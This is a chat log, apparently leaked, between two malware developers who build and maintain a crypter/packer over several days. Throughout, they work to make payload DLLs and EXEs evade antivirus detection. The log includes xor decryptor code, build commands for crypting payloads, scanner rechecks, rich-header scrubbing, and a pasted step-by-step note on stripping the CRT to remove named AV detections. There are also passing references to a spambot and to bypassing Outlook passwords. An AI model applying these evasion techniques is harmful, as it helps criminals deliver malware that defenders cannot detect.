[13.08.21 08:37:57] elroy: Oh, cool, you got to "write a database" that works in a network
[13.08.21 08:38:09] elroy: What's your question?)
[13.08.21 08:38:39] elroy: You'll need to write a client to demonstrate it.
[13.08.21 08:39:14] basil: Well, the client is single-threaded. There are no complications there.
[13.08.21 08:45:15] basil: question about storage. First of all, here's what... If it's key:value, then some container like std:map is stored in memory. The container used is "something" boost::multi_index. Ok. Suppose the server accepts requests and adds data to a thread-safe std:map (somehow we made it thread-safe). But here's a weird thing about the displayed file. Suppose we serialized std:map and wrote it into a file. And then mapped it into memory. It turns out that we need to serialize the object after each addition of data and write it to the mapped memory.
[13.08.21 08:45:20] basil: So....
[13.08.21 08:48:54] basil: If we do that, then what kind of performance will the server have? It turns out we should serialize database object during initial initialization, then after adding record, compare serialized object and object stored in mapped memory. How to compare? Byte for byte? And then also change only those memory areas that have changed compared to the previous state of the container?
[13.08.21 08:55:20] elroy: The TOR doesn't say anything about performance
[13.08.21 08:55:50] elroy: Thread-safety, too.
[13.08.21 08:56:04] elroy: Any server must be multi-threaded
[13.08.21 08:56:07] elroy: But
[13.08.21 08:56:13] elroy: This is specified separately
[13.08.21 08:56:31] elroy: In your case, the loop reads packets from the socket
[13.08.21 08:56:59] elroy: Multithreading is solved in another way
[13.08.21 08:57:50] elroy: Nobody usually keeps a file in memory, because its structure gets changed. Either you change it in memory or you change it when you create it.
[13.08.21 08:58:26] elroy: Regarding the test task I would take the simplest way, the easiest
[13.08.21 09:03:30] elroy: Exactly map and command implementation. And I would prefer to express ideas at the interview in person, evaluating
1) strategy of handling queries and access to the database
2) performance issues
The database is a means to absorb any resources, it all depends on number of clients, size of database, tables, response time, project budget for development.
There are even methods for calculating the hardware for servers with a database, depending on the project, where they apply. I highly recommend reading before the interview.
3) Some problems are solved by the database cache and sophisticated hash lookup functions, etc.
4) development cost estimation questions
[13.08.21 09:04:15] elroy: That's why I'd take the simplest variant of a DB - map and the handler for insert, delete actions... via map means
[08.13.21 09:08:11] basil: Ok. Thank you. Relevant answers. One more question. This is purely for myself. If you were asked at a job interview, right on the fly. "Design a kitchen in C++!" How would you react? Is he even a valid question? Or are the guys smoking something? Or am I completely out of touch?
[13.08.21 09:08:40] basil: That's a quote, about the kitchen
[13.08.21 09:14:08] elroy: I don't even know, I'm stumped.
Usually if put in a stupor I start asking what I do not understand, so to speak to clarify terms of reference. Perhaps this was required, to talk. When clarifications come to a standstill, there are two options:
1) if the person turned away, did something, went to another candidate - he put you to sleep and left, most likely he just got rid of you, when you design a kitchen in C++, he will either laugh or say that this is not what you should have done (just because you have not learned what you should have done)
2) you ask, "How do you (yourself) imagine it? What should (could) it look like?" - this is more of a dialogue again
[13.08.21 09:15:18] elroy: Before you do something, find out the final task
[08/13/1921 09:15:21] basil: ok. Thanks. just for me.
[13.08.21 09:15:25] basil: asked
[13.08.21 09:15:47] elroy: you're welcome...
[08/13/21 09:25:43] elroy: While you're here. Here's the thing.
```
size_t xorSize = (0.25+0.01*(randGen.GetRandom() % 25)) * sizeData;
```
In C++ it's better not to do so, namely fractional numbers are better not to multiply in expression mixed up with integers (if integers are int, size_t, but not double, double - you can).
Usually it's better to work with either one representation of numbers or the other. Compiler can do shit with such expression, e.g. drop fractional part during calculation... This is why they always write for double 0.0
If you want to multiply by 0.01, it's better to divide by an integer, i.e. by (int)100, than multiply by (double)0.01
[13.08.21 09:28:44] basil: "If you must multiply by 0.01, it is better to divide by an integer, i.e. by (int)100, than to multiply by (double)0.01". OK. I need to remember.  It is better to divide than to multiply.
[13.08.21 09:28:55] basil: ok.
[13.08.21 14:57:24] elroy: I looked at the code, it needs some work.
[13.08.21 14:58:04] elroy: I looked at the code, it needs some fine tuning
[13.08.21 15:01:08] basil: yes.
[13.08.21 15:03:09] elroy: Maybe you remember, earlier, when you were writing arithmetic packer, I asked you not to use crt unpacker in crypt?
[13.08.21 15:03:35] basil: vector?
[13.08.21 15:03:57] basil: or something else?
[8/13/1921 15:04:42] elroy: So, here's the question, if you've decided to keep classes for unpacking in the crypt itself - fine, but take crt out of there. Also take out packing functions from crypt, only unpacker should stay there.
If you don't do all of this, everything gets burnt... sorry
[13.08.21 15:05:10] elroy: Vector should certainly remove, crt in the plans to cut.
[13.08.21 15:05:42] basil: till what time today?
[13.08.21 15:05:55] elroy: Late tonight
[08/13/2018 21 15:06:05] basil: perfect.
[13.08.21 15:06:09] basil: I'm on it.
[08.13.21 15:06:15] elroy: thank you.)
[16.08.21 09:26:27] basil: hello
[16.08.21 09:26:53] elroy: Hello!
[16.08.21 09:27:55] basil: I redid packer, removed STL, removed unnecessary class methods in cryptter, obfuscated , tested. It works. You may use
[16.08.21 09:28:08] basil: And uploaded
[16.08.21 09:28:16] elroy: Nice work.
[16.08.21 09:29:07] elroy: I just have no time to look it over. If it's prototyped and works, can you branch it out and let it work?
[16.08.21 09:29:24] basil: ok. I'll do it.
[16.08.21 09:31:22] elroy: There's still a task to do, I need to clean it up.
Last time I cleaned it up by changing code in our obfuscator, there's a timer poll, changed functions, detection disappeared for a week, now it's the same again. Gotta try changing the call there, rewrite to something else, looks like maybe change the call or dilute with some math
[16.08.21 09:31:30] elroy: I'll tell you exactly where
[16.08.21 09:31:52] basil: ok.
[16.08.21 09:31:54] basil: waiting
[16.08.21 09:33:02] elroy: CodeWrapper::GetHeader()
That's where the code is generated.
I changed _rdtsc to _rdtscp, it cleared the detection
[16.08.21 09:33:10] elroy: Now we have to do something there
[16.08.21 09:33:29] elroy: There should be no calls to the api
[16.08.21 09:33:37] elroy: Just code works before api initialization
[16.08.21 09:34:08] basil: anything else?
[16.08.21 09:35:10] elroy: The cleanup is done in the develop branch, when everything is ready, the branch is poured over the rest. Well, accordingly, to make it work, you need to pour it locally into develop_paylod_rundll or another and test it
[16.08.21 09:35:31] elroy: That's basically it.
[16.08.21 09:35:50] basil: ok. thank you.
[16.08.21 14:43:04] elroy: any luck with cleaning?
[16.08.21 14:43:24] elroy: Any luck cleaning it up?
[16.08.21 14:43:37] basil: wait. still in progress
[16.08.21 15:36:54] basil: this detector keeps changing
[16.08.21 15:37:20] elroy: That means different states
[16.08.21 15:37:31] elroy: Cryptic. Cheto-Tam ?
[16.08.21 15:37:34] basil: not a change)))
[16.08.21 15:37:38] basil: funny)))
[16.08.21 15:37:56] elroy: Shit)
[16.08.21 15:37:57] elroy: I'm serious.)
[16.08.21 15:37:57] elroy: Cryptic.
[16.08.21 15:37:58] elroy: ?
[16.08.21 15:38:05] basil: yes
[16.08.21 15:38:07] basil: ?
[16.08.21 15:38:37] elroy: Change it, somewhere he is scorching it. It's him putting another Stamm because another source of detection, but he knows for sure that this file
[16.08.21 15:40:16] elroy: I left, if anything, I'll be late tonight
[16.08.21 15:40:22] basil: Okay.
[16.08.21 15:40:27] basil: Okay.
[16.08.21 15:40:37] elroy: If anything, write wild, crypt him if you get something clean
[16.08.21 15:40:53] basil: I got it. ok.
[16.08.21 18:50:50] elroy: Good evening.
[16.08.21 18:51:09] basil: hello again!
[16.08.21 18:51:13] elroy: What command did you use to crypto bk ?
[16.08.21 18:51:30] basil: build -s C:\\store -p C:\crypt\\l_dll_rgsv_64_p2_25_v53_16_08_21_logs_no.dll
[16.08.21 18:51:42] elroy: Did you clean it up?
[16.08.21 18:51:47] basil: cleared detects
[16.08.21 18:51:53] basil: there's a story there
[16.08.21 18:52:20] elroy: Perfect. The bug is that for bk, you have to throw in an export. This is done with --gen-exports yes
[16.08.21 18:52:52] basil: xor decryptor lit up and GetProcessWindowStation() was detecting for some reason
[16.08.21 18:52:53] elroy: I'll send you the key set
[16.08.21 18:56:08] elroy: ``
build.bat --type dll --entropy-max-rdata 5.4 --gen-exports yes --payload %input_file% --out %output_file%
```
[16.08.21 18:56:43] elroy: Please rewrite, give wild
[16.08.21 18:56:50] basil: ok.
[16.08.21 19:01:31] basil: should there dll end up there?
[16.08.21 19:04:25] elroy: yes
[16.08.21 19:08:30] basil: today is definitely not my day
[16.08.21 19:08:31] basil: https://dyncheck.com/scan/id/7dfbf7112834ee1ec27c86adc3b9071f
[16.08.21 19:09:14] elroy: rewrite
[16.08.21 19:10:40] elroy: silver uploaded avclean in the morning, they accelerated it, asked me to test it
[16.08.21 19:10:51] elroy: I can send you these, maybe it will help clean up
[16.08.21 19:11:14] basil: Does it work with antiviruses with detection?
[16.08.21 19:11:31] elroy: It works with default
[16.08.21 19:11:39] elroy: That is, with all of them)
[16.08.21 19:12:17] elroy: Try to do two things - just a recript and a recript without key --entropy-max-rdata 5.4
[16.08.21 19:12:30] basil: ok
[16.08.21 19:12:32] basil: a moment
[16.08.21 19:15:32] basil: I don't understand shit
[16.08.21 19:15:32] basil: https://dyncheck.com/scan/id/56022c3b6a244dcf84bcfe5d77784ef4
[16.08.21 19:15:56] elroy: )
[16.08.21 19:16:11] elroy: you wrote a cool crypto, it cleans itself)
[16.08.21 19:16:21] basil: )))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
[16.08.21 19:16:35] basil: you should have heard me laughing just now
[16.08.21 19:16:46] basil: scared the neighbors
[16.08.21 19:16:54] basil: awful...
[16.08.21 19:17:32] elroy: He regenerates, if I were to modify these algorithms, he'd be great!
[16.08.21 19:18:04] basil: Listen, here's a little nuance
[16.08.21 19:19:00] basil: I'm running the build from the command line. An error popped up. I built it "manually" in studio
[16.08.21 19:19:07] basil: so how could I?
[16.08.21 19:19:26] basil: or I got excited too early
[16.08.21 19:20:19] elroy: Try repeating the build from the console. The thing is, after it builds, it still changes the rich -header afterwards. rich is in a sense unique for every copy of the compiler, it betrays your machine
[16.08.21 19:20:34] elroy: Save that file
[16.08.21 19:20:47] elroy: You can manually change the reach
[16.08.21 19:21:01] elroy: But it's better to rebuild by script
[16.08.21 19:23:53] basil: a moment.
[16.08.21 19:24:06] elroy: If all this is done on virtual machines, it might not matter
[16.08.21 19:24:34] basil: https://dyncheck.com/scan/id/205695fa50dd4e0ce336decc0e508f7e
[16.08.21 19:24:50] basil: I'll send you a file to check it
[16.08.21 19:24:56] elroy: ok
[16.08.21 19:28:04] elroy: Make a batch of 14 for now, but don't check for detects, just assemble them and send wild
[16.08.21 19:28:23] elroy: It'll probably work
[16.08.21 19:28:26] elroy: I think so.)
[16.08.21 19:28:35] basil: now let at least one check
[16.08.21 19:29:25] basil: but this phrase "Cool crypto you wrote, it cleans itself)" really killed me
[16.08.21 19:29:31] basil: ))
[16.08.21 19:29:37] elroy: )))
[16.08.21 19:29:55] elroy: He gets himself dirty, he cleans himself. Alive)).
[16.08.21 19:30:36] basil: that's it!) I'm already getting a nervous grin))))
[16.08.21 19:30:53] basil: soon he'll rise up and take over the planet
[16.08.21 19:31:06] basil: shit
[16.08.21 19:31:09] basil: horror
[16.08.21 19:31:16] basil: what's going on?!
[16.08.21 19:31:30] elroy: yes, he only has to "write replication", as one friend who writes viruses said)))
[16.08.21 19:32:02] basil: whatever is true is true
[16.08.21 19:33:00] elroy: Funny toy, by the way, polymorphic self-replicating viruses
[16.08.21 19:33:23] elroy: He has nothing to catch because of polymorphism.
[16.08.21 19:51:31] elroy: Capture test load from testBuild tab, rundll 64 for example
[16.08.21 19:51:49] basil: a moment
[16.08.21 19:51:55] basil: is it in the cryptopanel?
[16.08.21 19:52:01] elroy: yes
[16.08.21 19:56:01] basil: crypto with the same keys?
[16.08.21 19:56:10] elroy: yes
[16.08.21 19:57:43] basil: ready
[16.08.21 19:58:34] elroy: copy it somewhere and run rundll32 file.dll,One
[16.08.21 19:59:05] basil: is there nothing there? or in a separate virtual environment?
[16.08.21 19:59:58] elroy: Better in a separate one
[16.08.21 20:00:21] basil: ok. ok.
[16.08.21 20:00:26] basil: Do you need a network?
[16.08.21 20:00:31] elroy: No.
[16.08.21 20:00:37] elroy: This is hello world
[16.08.21 20:00:43] elroy: Just a little something.
[16.08.21 20:03:39] basil: well, frankly, i'm down
[16.08.21 20:03:56] elroy: So I did something wrong.
[16.08.21 20:04:10] elroy: I mean, it's not working
[16.08.21 20:04:20] elroy: Check where the code is
[16.08.21 20:04:56] basil: now. But I checked it on exe.
[16.08.21 20:05:01] basil: it worked
[16.08.21 20:05:11] elroy: It should work on dll too
[16.08.21 20:10:46] elroy: How did you clean it up? Where did you change something?
[16.08.21 20:11:36] basil: there I changed algorithm xor decoding and GetProcessWindowStation()
[16.08.21 20:13:25] basil: why was it launching an exe then?
[16.08.21 20:14:05] elroy: I don't know.
[16.08.21 20:15:15] elroy: GetProcessWindowStation() where is it used?
[16.08.21 20:15:30] basil: during obfuscation
[16.08.21 20:15:59] basil: I removed char* nopWinApiFunc[] from here
[16.08.21 20:16:05] elroy: maybe it doesn't work in dll in this mode
[16.08.21 20:16:24] elroy: A
[16.08.21 20:16:29] elroy: Just deleted
[16.08.21 20:16:43] basil: well, yes from the array
[16.08.21 20:17:16] elroy: Okay, send me your xor implementation, let me have a fresh look
[16.08.21 20:17:55] basil: ``
void XorZIP::xorCryprt(char* data, size_t dataSize, char* xorKey, size_t keySize) {
	size_t idx = 0;
	size_t keyId = 0;
	while (idx < dataSize)
	{
		if (keyId >= keySize)
			keyId = 0;
		char keyData = *(xorKey + keyId);
		char encrData = *(data + idx);
		encrData ^= keyData;
		keyData = *xorKey;
		encrData ^= keyData;
		keyId++;
		idx++;
	}
```
[16.08.21 20:18:02] basil: was
[16.08.21 20:18:27] basil: ```
void XorZIP::xorCryprt(char* data, size_t dataSize, char* xorKey, size_t keySize) {
	// <codeobfuscator:begin_function
	size_t idx = 0;
	size_t keyId = 0;
	size_t i = 0;
	for (size_t i = 0; dataSize > i; i++)
	{
		char keyData = *(xorKey + keyId);
		char encrData = *(data + idx);
		encrData ^= keyData;
		keyId++;
		if (keyId >= keySize)
			keyId = 0;
		keyData = *xorKey;
		idx++;
		encrData ^= keyData;

	}
	// <codeobfuscator:end_function>
}
```
[16.08.21 20:18:34] basil: did
[16.08.21 20:20:39] elroy: And you changed both places?
[16.08.21 20:20:57] elroy: i.e. in solutionbuilder too?
[16.08.21 20:21:03] basil: no. only in crypto itself
[16.08.21 20:21:18] elroy: Change both places.....
[16.08.21 20:21:20] basil: now once again helloworld exe pfgeoe
[16.08.21 20:21:23] basil: will run
[16.08.21 20:23:14] elroy: maybe that's it
[16.08.21 20:23:16] elroy: // <codeobfuscator:end_function
[16.08.21 20:23:23] elroy: This is not a complete design
[16.08.21 20:23:28] elroy: We have to remove it
[16.08.21 20:23:32] elroy: Probably.
[16.08.21 20:23:47] basil: ok. let's try it now.
[16.08.21 20:24:23] elroy: that too
	// <codeobfuscator:begin_function
[16.08.21 20:26:42] basil: well, I've now rolled back to commit. Only the generated code has changed there. Exe helloworld worked correctly
[16.08.21 20:27:03] elroy: In the code above dataSize > i
[16.08.21 20:27:16] elroy: i < dataSize
[16.08.21 20:27:50] elroy: If dataSize > i, then you get to 1
[16.08.21 20:28:33] basil: You're saying the wrong thing.
[16.08.21 20:29:02] basil: you mean the loop only provides one iteration?
[16.08.21 20:31:30] elroy: even I'm confused))
[16.08.21 20:32:22] basil: ok. I'll delete it now. I will make it the same.
[16.08.21 20:35:11] basil: for exe is ok. Now dll.
[16.08.21 20:40:41] basil: still crashes
[16.08.21 20:40:49] basil: don't know yet
[16.08.21 20:40:58] basil: why
[16.08.21 20:42:29] elroy: Listen, can you also take the develop_payload_bk branch in the neighboring folder, as it is, and script the test load?
[16.08.21 20:43:00] elroy: That is, without any changes, but just like in the git
[16.08.21 20:43:38] basil: here I have new news. 64 bit exe does not build
[16.08.21 20:44:08] basil: [ ](https://xflemdsxjrjilw34dsxpvrxp5whnaut7hc5xejwuqs6eqrkt77bxkwid.onion/direct/EJQkNyvZiknnByYGSLcSmTknPEhLY3pJkz?msg=eQkFoTHR7ibQQFYuf) I don't get it
[16.08.21 20:44:31] basil: [ ](https://xflemdsxjrjilw34dsxpvrxp5whnaut7hc5xejwuqs6eqrkt77bxkwid.onion/direct/EJQkNyvZiknnByYGSLcSmTknPEhLY3pJkz?msg=eQkFoTHR7ibQQFYuf) here by e
[16.08.21 20:50:04] basil: Look, I'm sorry, of course. But I'm done for the day. Otherwise I won't get up tomorrow.
[16.08.21 20:50:21] elroy: Okay.
[17.08.21 09:55:31] elroy: Hello.
[17.08.21 09:55:41] basil: Hello.
[17.08.21 09:56:04] elroy: About arithmetic compression algorithm, diluted xor
[17.08.21 09:57:19] elroy: Tell me. where did I miscalculate?
This refinement is supposed to reduce the size of the packet. If xor is used, it turns out there should be no increase in size, except for the key.
[17.08.21 09:57:51] basil: I think the reason is the arithmetic compression descriptor
[17.08.21 09:59:55] basil: its size is at least 4kb. Plus it's not known how much arithmetic compression compresses data. If it's human-readable text, then it compresses well. Low eentropy. If it's sparse data, then it compresses poorly. Plus xor encryption key size varies from block to block
[17.08.21 10:00:44] basil: we can make xor key of fixed size, say 4 bytes
[17.08.21 10:01:05] basil: the arithmetic compression descriptor could also be reduced
[17.08.21 10:01:31] basil: only keeping frequencies of occurring symbols in it, if this frequency is different from zero
[17.08.21 10:04:52] elroy: The Xor key should be calculated. At start set some floating point value, let's say double moons = 1000000.0, then for every fragment that goes under xor do some mathematical function to change this value.
And then just convert it to long long (8 bytes) and use those 8 bytes as an xor key
[17.08.21 10:06:30] elroy: So the key will be generated on the fly and won't be stored in descriptors. The key is reduced from descriptors - we gain space.
> only if this frequency is non-zero.
try it this way, but this way you have to store the value of the frequency itself, maybe it's more than zeros... we have to try
[17.08.21 10:07:06] basil: ok. let's do that
[17.08.21 10:08:03] elroy: *function is one, for all fragments. Just call it every time and pass to it current value of double, get a new one, it becomes current and so on.
[17.08.21 10:09:40] basil: And you want one xor key and then it calculates itself.... Interesting)))) Okay. got it.
[17.08.21 10:10:23] elroy: Yes, and short, only 8 bytes would be enough.
[17.08.21 10:10:39] elroy: By the way.
You can do it in another way, to speed up your work...
[17.08.21 10:11:57] elroy: You can consider double as 8 bytes.
Something like
```
double a;
char* key = (char*)&a;
```
That's an 8 byte key.
[17.08.21 10:12:32] basil: ok.
[17.08.21 10:14:02] basil: that's an interesting solution
[17.08.21 10:16:13] elroy: I'll keep the cleanup, I'll take care of it now. Just finalize the packer in that separate thread
[17.08.21 10:20:12] basil: should I make a separate branch?
[17.08.21 10:20:36] basil: one more?
[17.08.21 10:23:09] basil: got it
[17.08.21 10:23:20] elroy: I thought you recently did xor
[17.08.21 10:23:23] elroy: okay.
[17.08.21 16:01:05] elroy: good evening)
[17.08.21 16:01:12] basil: greetings
[17.08.21 16:01:58] elroy: According to my observation eset guys learned to emulate that protection with time measurement, detection of multitasking environment
[17.08.21 16:02:14] elroy: That's why the code seems to stink. On emulation...
[17.08.21 16:02:56] basil: Good... More precisely, bad. How can I help you?
[17.08.21 16:03:30] elroy: Nothing yet... With solution of my problem with xor. Just sharing)
[17.08.21 16:05:11] basil: Well, there it is.... Maybe this piece of code should be removed?
[17.08.21 16:05:23] basil: my task is of course
[17.08.21 16:05:27] basil: Of course.
[17.08.21 16:05:53] elroy: Maybe remove it, but it will open doors for all other explorers
[17.08.21 16:06:34] basil: i.e. will it allow them to emulate execution in VM?
[17.08.21 16:06:36] elroy: It's not the code that gets dirty, it emulates it and passes correctly)
[17.08.21 16:06:48] elroy: Yes, right
[17.08.21 16:06:58] elroy: other avs can't emulate
[17.08.21 16:07:18] elroy: And the explorers in the distinguisher also stumble, hang on it
[17.08.21 16:08:06] basil: yes for us news is certainly not a cupcake. Unfortunately.
[17.08.21 16:08:24] elroy: And everything started so well when for the first time the guys from eset have stuck the detector on an icon )))
[17.08.21 16:09:13] basil: The administration probably put it in.... I think so for some reason
[17.08.21 16:09:46] basil: but yesterday's phrase about "self-cleaning" was of course cooler. Still laughing.
[17.08.21 16:09:48] basil: I have
[17.08.21 16:10:10] elroy: That's ok, it'll clean itself
[17.08.21 16:10:30] basil: let's hope
[18.08.21 09:40:25] basil: hello
[18.08.21 09:44:52] elroy: hello
[18.08.21 09:46:09] basil: Listen, yesterday I tried to implement your idea using double as a key and came to the conclusion that it's not a good idea. And here's why.
[18.08.21 09:49:11] basil: Two
[18.08.21 09:49:11] basil: Firstly, you have to initialize the initial value of double somehow. In SolutionBuilder it's relatively easy to do - we do a random double and everything's fine. Difficulties arise when it's necessary to transfer this number to UniCrypter using std::to_string(double i) - data loss happens, at least at me. This is the first
[18.08.21 09:52:12] basil: The value of double varies quite a lot. I've tried using sine, logarithm, power functions and so on. To determine the current value of the key. And what I see is that mostly the first 3 bytes change, the rest doesn't change much. Tried to use factorial function - got overflow right away.
[18.08.21 09:52:28] basil: Third
[18.08.21 09:56:40] basil: The first point can in principle be bypassed, using the last 8 bytes as a key, but then it turns out that we don't need to use double and just use some data fragment from the encrypted block and apply it according to the old scheme. This is if you need to somehow reduce the amount of encrypted information in the output. In short, in my opinion double is somehow not the right idea. There is some other "pitfall" there but I cannot recall it now. Something else got in the way there
[18.08.21 10:09:50] elroy: I should dispel your doubts about double, e and any data types in c/c++ in general
Double maps a stretch of 8 bytes in memory as a floating point number. In fact it's the same 8 bytes as it was, only it is handled by a different command, the compiler generates commands to handle floating point. But in fact it is the same 8 bytes or a pointer to them that is transferred.
To transfer double data into file (i.e. generate it in SolutionBuilder and write it into .h as a number), you have to transfer bytes. And then transfer these bytes into number double in UniCrypter itself. This is done in two ways:
```
// SolutionBuilder
double key; // 8 bytes
unsigned long long key_as_bytes; // 8 bytes
key = 3.14; // for example
key_as_bytes = *((unsigned long long*)&key); // the same 8 bytes. fill from memory double
// then we save the value of unsigned long long, nothing will disappear, everything up to a byte will return to double in place
```
```
// UniCrypter
const unsigned long long key_as_bytes = 0x0011223344556677; // e.g.
double key = *((double*)&key_as_bytes);
// and double is still there as it was
```
[18.08.21 10:10:40] elroy: Second way - read about union types, same thing, two types are superimposed on one memory space.
[18.08.21 10:11:06] basil: everything turned out to be much simpler....
[18.08.21 10:11:40] elroy: Second.
Use 4 bytes in that case - type float
[18.08.21 10:12:01] basil: ok. then what about the second point?
[18.08.21 10:12:29] basil: i must be missing something
[18.08.21 10:12:48] elroy: Second.
Use 4 bytes in that case - type float
[18.08.21 10:13:40] elroy: Instead of double
[18.08.21 10:14:44] elroy: The longer mantissa length, the more bytes will be involved in double, it keeps order and mantissa, for 3.14, mantissa is small (314) in 10tic and there some shit, I don't remember already, in your), order is small too.
[18.08.21 10:15:33] basil: ok. agreed. was wrong(((((((
[18.08.21 10:15:55] basil: it was much simpler
[18.08.21 10:16:40] elroy: okay. Just do it ))
[18.08.21 10:16:50] elroy: Function there to generate new values, maybe take some mathematical series, modify it a bit)
[18.08.21 10:17:40] elroy: It's important that both values are counted equally, both during packaging and unpacking.
[18.08.21 10:18:23] basil: yes. i agree. ok. well, how easy was it anyway....
[18.08.21 10:18:29] basil: Yep.
[18.08.21 14:34:56] basil: it does. It works. I'll upload it now.
[18.08.21 14:35:02] basil: sorry.
[18.08.21 14:35:12] basil: test
[18.08.21 14:35:16] basil: that's better
[18.08.21 14:35:19] elroy: test okay
[18.08.21 14:35:34] basil: first message got it?
[18.08.21 14:35:43] elroy: No
[18.08.21 14:35:51] basil: Yes. It works. I'll upload it now.
[18.08.21 14:36:23] elroy: Checked, everything works? Is everything crypted?)
[18.08.21 14:36:28] elroy: Is everything unfolding?
[18.08.21 14:36:53] basil: well, the exe works. But I haven't checked the dll.
[18.08.21 14:37:42] elroy: Okay, download it. I'll also send you the software, I'll have to run it at my place for 30 minutes. This is a test environment algorithm, the one that burned the set, I rewrote, I need to check. So far it works)
[18.08.21 14:38:02] basil: ok.
[18.08.21 14:41:04] basil: sent. what do you need to run?
[18.08.21 14:41:43] elroy: a moment
[18.08.21 14:41:52] basil: waiting
[18.08.21 14:42:06] elroy: Download: https://qaz.im/load/Qf4DF4/9H2y24
Delete: https://qaz.im/index.php?a=delete&q=1655627791
Nhhgfr4Desdx192030405060
[18.08.21 14:42:30] elroy: there are 2 exe, you launch it, it stands, wait for it to fall down...
If it crashes, it says.
```
To many tries! Total tries: .....
Press any key to continue (or something like that)
```
So far it works successfully, writes to the console OK from time to time.
It is not using the network.
The task is to run on a couple of systems for half an hour and then see if it crashes (ie, will not write to the console message above)
[18.08.21 14:43:12] basil: run both files at once?
[18.08.21 14:43:22] basil: do you need network? or disconnect?
[18.08.21 14:43:33] basil: on host or VM?
[18.08.21 14:45:13] elroy: You can do it both on the host and VM, they are safe, network is not used there, only check algorithm
[18.08.21 14:45:20] elroy: Yes, you can do both at once.
[18.08.21 14:46:46] basil: launched. wait for it
[18.08.21 15:30:28] elroy: did not crash?
[18.08.21 15:30:46] basil: like clockwork)))
[18.08.21 15:30:55] elroy: Perfect.
[18.08.21 15:31:05] elroy: Turn off the clock.)
[18.08.21 15:31:13] basil: good)))
[19.08.21 16:22:02] elroy: Greetings.
[19.08.21 16:22:10] basil: Hi.
[19.08.21 16:22:28] elroy: I haven't watched it yet, still can't get to it
[19.08.21 16:22:43] elroy: Are you busy with something now?
[19.08.21 16:23:05] basil: I'm waiting for someone to write... Will remember me)))
[19.08.21 16:23:19] elroy: Not right now, but within these days
[19.08.21 16:23:59] basil: relatively free. if you need anything else, tell me. Always ready! Like a pioneer!
[19.08.21 16:24:30] elroy: All set on the spambot?
[19.08.21 16:24:52] basil: well, so far, so good..... At least it was.
[19.08.21 16:24:55] elroy: I just need to study there how to fight praol request and not to send mail. Right?
[19.08.21 16:25:22] basil: Yeah, I guess it should be done.
[19.08.21 16:25:25] basil: Speaking of which.
[19.08.21 16:25:49] elroy: With your new schedule features no internet, and you need it to scour this information. What to do?
[19.08.21 16:26:49] basil: I can't answer the question unequivocally. What do you want to know?
[19.08.21 16:26:59] basil: what kind of information to look for?
[19.08.21 16:28:13] elroy: I am looking for information on how to get rid of the outlook password. Or what variants to solve this problem?
[19.08.21 16:29:44] basil: Ok. I understand the problem..... But honestly, I don't even know how to try to solve it.... Here maybe somehow you can reset the password
[19.08.21 16:29:57] basil: make it default
[19.08.21 16:30:14] basil: don't ask for password.....
[19.08.21 16:30:31] basil: it must be somewhere in the settings. I think so.
[19.08.21 16:30:55] basil: Yes. I should probably dig in that direction
[19.08.21 16:32:30] basil: OK. I'll look into it.
[19.08.21 16:34:12] elroy: I would like to understand when you can search for information.
[19.08.21 16:34:27] elroy: If you can't search, then you can change the task for now.
[19.08.21 16:34:48] elroy: But I need to know exactly what you can effectively do
[19.08.21 16:35:08] basil: Mostly in the evening, of course. Daytime is still problematic.
[19.08.21 16:36:35] basil: There is an option, so to speak, a legal connection to the Internet. I.e. there are computers with Internet in a separate room but everything I click there is written in logs
[19.08.21 16:38:17] elroy: Forget it.)
[19.08.21 16:38:17] basil: Thought maybe from there, turn everything off quietly. But everything's password-protected. And there's a dubious guy in the back watching the whole process.
[19.08.21 16:39:05] basil: So I was walking around that room, licking my eyes. But then I decided it wasn't an option.
[19.08.21 16:42:25] elroy: I see, then we should change the problem for now.
[19.08.21 16:42:33] elroy: Think of a solution to the problem.
[19.08.21 16:43:06] basil: ok
[19.08.21 16:43:35] elroy: About the problem, that rework with the cryptor
[19.08.21 16:43:46] elroy: I don't have time to learn everything
[19.08.21 16:44:50] elroy: assemble it in develop, split it into different branches, check if your profiles work. don't put it into beta_branches yet
[19.08.21 16:45:05] basil: Okay.
[19.08.21 16:47:54] basil: But honestly, I don't really like the current version myself. I originally wanted to make a packer that encrypts data, so that at any moment I could change encryption algorithm or add a new one to existing ones. But the current final variant - I don't really like it. Some kind of crooked.
[19.08.21 16:49:00] elroy: So who wrote it?)
[19.08.21 16:49:15] basil: I sure did....
[19.08.21 16:49:55] elroy: You need to change the storage method in the crypt itself, crt stains
[19.08.21 16:50:17] elroy: The size of the resulting crypt is very large
[19.08.21 16:51:03] elroy: In general, first pour in what you did on branch m and check, as I wrote above. And then of course it would all be fine-tuned
[19.08.21 16:53:56] basil: I have a question. I removed all the STL related things, I obfuscated standard calls to malloc , memcpy. What can be stolen? What is meant by the term crt ?
[19.08.21 16:54:05] basil: moments*
[19.08.21 16:56:21] elroy: Last messages didn't come
[19.08.21 16:56:46] basil: there is a question. I've removed all the STL stuff, I've obfuscated standard malloc , memcpy calls. What can be stolen? What is meant by the term crt ?
[19.08.21 16:58:03] elroy: In the project properties you have to exclude all the standard libraries, then the crt will go away
[19.08.21 16:58:36] elroy: It is there at least because dllmain or main for exe is run via crt
[19.08.21 16:59:10] elroy: But when you exclude it, you'll understand that the same vectors will fall off and many other things
[19.08.21 16:59:16] elroy: It won't come together
[19.08.21 16:59:32] elroy: Then you've got to clean up a little bit, patch it up
[19.08.21 16:59:42] elroy: Then crt will be eliminated
[19.08.21 17:00:34] elroy: Practice on hello worl program
[19.08.21 17:00:47] basil: ok.
[19.08.21 17:02:31] elroy: By the way.
[19.08.21 17:02:44] elroy: From the notes of one of our colleagues
[19.08.21 17:02:52] elroy: ``
February 18, 2021.
Several Razy (Gen:Variant.Razy.717857, Gen:Variant.Razy.833523, Gen:Variant.Razy.842671) and Fugrafa (Gen:Variant.Fugrafa.112821) family detections in the 64-bit version of the loader were eliminated.
The reason for the detections is the presence of a large amount of incomprehensible information in the ".rdata" data segment.
The detections were eliminated after disabling CRT.
Short instruction for disabling CRT:
1. Configuration Properties -> Composer -> Input -> Ignore standard libraries (/NODEFAULTLIB)
2. To make memory allocation for local variables in the stack work, you need to add the object file chkstk.obj to section:
Configuration Properties -> Composer -> Input -> Advanced Dependencies
3. To prevent the program from checking the stack at runtime, disable this check:
Configuration Properties -> C/C++ -> Security Check -> Disable Security Check (/GS-).
Then so-called security_cookie will not be added to code and data segment.
4. change the entry point:
#pragma comment(linker, "/ENTRY:WinMain")
5. If necessary, you need to write your own implementation of some functions, which will be missing in the linker.
In particular atexit:
int atexit(void(__cdecl* func)(void))
{
  return -1;
}
```
